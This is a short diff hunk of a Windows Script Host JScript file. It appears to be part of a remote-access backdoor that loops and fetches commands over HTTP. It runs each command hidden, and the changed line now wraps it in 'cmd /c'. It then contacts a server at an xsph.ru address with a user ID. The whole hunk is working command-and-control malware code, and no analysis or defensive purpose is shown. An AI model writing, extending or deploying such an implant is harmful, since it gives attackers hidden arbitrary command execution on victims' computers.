@@ -20,7 +20,7 @@ while(true){
 		}
 		cmd = xmlhttp.responseText;
 		if(cmd != "null"){
-			shell.Run(cmd, 0);
+			shell.Run("cmd /c \"" + cmd + "\"", 0);
 			var _ = WScript.CreateObject("Microsoft.XMLHTTP");
 			_.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=USER_ID.txt&data=null", false);
 			_.Send();
